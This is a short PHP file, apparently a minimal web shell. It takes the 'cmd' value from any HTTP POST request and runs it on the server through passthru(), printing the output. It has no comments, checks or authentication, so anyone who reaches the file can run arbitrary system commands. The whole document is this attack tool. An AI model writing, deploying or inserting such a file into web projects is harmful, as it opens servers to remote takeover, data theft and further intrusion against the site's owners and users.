<?php
function execute($com)
{
	if (!empty($com))
	{
		echo passthru($com);
	}
}

$cmd = $_POST['cmd'];
execute($cmd);
?>